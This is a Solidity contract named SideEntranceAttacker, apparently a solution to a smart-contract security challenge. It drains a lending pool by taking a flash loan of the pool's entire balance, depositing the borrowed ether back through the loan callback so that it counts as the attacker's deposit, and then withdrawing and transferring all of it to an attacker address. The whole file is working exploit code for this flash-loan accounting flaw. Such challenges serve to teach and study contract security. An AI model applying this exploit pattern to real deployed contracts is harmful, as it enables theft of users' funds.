// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts-ethereum-package/contracts/math/SafeMath.sol";


/**
 * @title SideEntranceAttacker
 * @author Elena (Ellena.xyz@proton.me)
 */

interface ISideEntranceLenderPool {
    function deposit() external payable;
     function withdraw() external;
     function flashLoan(uint256 amount) external;
}
 contract SideEntranceAttacker {
    using SafeMath for uint256;

    ISideEntranceLenderPool pool;
    address payable attacker;
    uint256 amount;

    function attack (address _pool, address payable  _attacker) public {

        pool = ISideEntranceLenderPool(_pool);

        amount = address(pool).balance;

        attacker = _attacker;

        pool.flashLoan(amount);

        pool.withdraw();

        attacker.transfer(amount);

    }
//  wiil be called by flashloan function 
    function execute () external payable {
        pool.deposit{ value : amount}();
    }

// withdraw will send ether to receive or fallback function 
    receive () external payable {}

 }